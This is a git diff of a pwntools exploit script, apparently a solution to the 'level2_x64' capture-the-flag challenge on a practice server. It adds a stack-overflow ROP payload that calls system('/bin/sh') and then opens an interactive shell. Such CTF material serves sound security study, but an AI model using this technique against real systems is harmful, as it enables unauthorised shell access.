@@ -2,16 +2,16 @@ from pwn import *
 from pwn import p64
 
 
-debug = 1
+debug = 0
 gdb_is = 1
 # context(arch='i386',os = 'linux', log_level='DEBUG')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
     context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
-    r = process("./pwn")
+    r = process("./level2_x64")
 else:
     host = "node4.buuoj.cn"
-    r = connect(host,30709)#远程连接
+    r = connect(host,26205)#远程连接
     gdb_is =0
 
 if gdb_is:
@@ -22,8 +22,9 @@ if gdb_is:
 
 # libc = ELF('./libc-2.31.so')
 # elf = ELF('./vuln')
+binsh = 0x00600A90
+payload = b'A'*0x80 +b'junkjunk'+ p64(0x04006b3) + p64(binsh) +p64(0x0004004a1)+ p64(0x4004c0)
 
-# r.sendlineafter()
-# r.send()
-# r.recvuntil()
+r.send(payload)
+
 r.interactive()
